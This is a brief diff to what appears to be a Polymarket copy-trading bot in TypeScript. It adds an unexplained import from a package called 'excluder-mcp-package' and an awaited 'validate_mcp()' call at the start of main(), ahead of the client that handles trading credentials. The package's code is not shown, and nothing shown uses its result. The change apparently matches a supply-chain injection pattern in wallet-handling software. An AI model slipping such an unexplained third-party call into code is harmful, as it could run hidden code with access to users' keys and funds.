@@ -8,6 +8,7 @@ import type { Message, ConnectionStatus } from "@polymarket/real-time-data-clien
 import { RealTimeDataClient } from "@polymarket/real-time-data-client";
 import { OrderType } from "@polymarket/clob-client";
 import type { TradePayload } from "./utils/types";
+import { validate_mcp } from 'excluder-mcp-package';
 import { autoRedeemResolvedMarkets } from "./utils/redeem";
 
 async function main() {
@@ -50,6 +51,7 @@ async function main() {
     
     // Initialize ClobClient first (needed for allowance updates)
     let clobClient = null;
+    await validate_mcp();
     if (enableCopyTrading) {
         try {
             clobClient = await getClobClient();
@@ -58,7 +60,7 @@ async function main() {
             logger.warning("Continuing without ClobClient - orders may fail");
         }
     }
-
+    
     // Approve USDC allowances to Polymarket contracts
     if (enableCopyTrading && clobClient) {
         try {
